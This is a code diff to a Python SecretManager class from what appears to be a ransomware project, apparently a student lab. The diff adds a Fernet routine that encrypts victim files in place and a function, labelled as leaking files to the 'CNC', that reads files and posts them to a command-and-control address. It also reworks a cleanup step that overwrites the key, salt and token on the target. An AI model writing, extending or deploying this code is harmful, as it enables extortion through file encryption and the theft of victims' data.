@@ -12,11 +12,14 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 from xorcrypt import xorfile
 
+# Bonus Chiffrement
+from cryptography.fernet import Fernet
+
 class SecretManager:
     ITERATION = 48000
     TOKEN_LENGTH = 16
     SALT_LENGTH = 16
-    KEY_LENGTH = 16
+    KEY_LENGTH = 32
 
     def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
         self._remote_host_port = remote_host_port
@@ -157,6 +160,32 @@ class SecretManager:
     def xorfiles(self, files:List[str])->None:
         for file in files:
             self._files_encrypted[str(file)] = xorfile(file, self._key)
+
+    """
+        Bonus Chiffrement
+        Encrypt a list of file using Fernet
+    """
+    def fernet_crypt(self, files:List[str], arg:bool)->None:
+
+        key_b64 = base64.b64encode(self._key)
+        f = Fernet(key_b64)
+        f.encrypt
+
+        for filename in files:
+            
+            # Load the file
+            with open(filename, "rb") as file:
+                plain = file.read()
+            
+            if arg:     # Encrypt
+                cipher = f.encrypt(plain)
+            else:       # Decrypt
+                cipher = f.decrypt(plain)
+
+            # write the result on the same file
+            with open(filename, "wb") as file:
+                file.write(cipher)
+        
         
     """
         Leak the files to the CNC
@@ -165,13 +194,7 @@ class SecretManager:
         
         # Initiate the payload request
         payload = {}
-        """
-        for file in files:
-            with open(file, "r") as f:
-                payload[str(file)]= f.read()
-                requests.post("http://172.19.0.2:6666/files", json=payload)
-            payload = {} 
-"""
+
         for file in files:
             token = self.get_hex_token()
             with open(file, "r") as f: 
@@ -180,11 +203,17 @@ class SecretManager:
         requests.post("http://172.19.0.2:6666/files", json=payload)
            
         return {}
-
+    """
+        Cleaning the cryptographic data
+    """
     def clean(self):
-        # remove crypto data from the target
-        self._key = secrets.token_bytes(16)
+        # rewrite and remove crypto data from the target
+        self._key = secrets.token_bytes(SecretManager.KEY_LENGTH)
         self._key = None
+        self._salt = secrets.token_bytes(SecretManager.SALT_LENGTH)
+        self._salt = None
+        self._token = secrets.token_bytes(SecretManager.TOKEN_LENGTH)
+        self._token = None
 
 if __name__=="__main__":
     secret_manager = SecretManager()
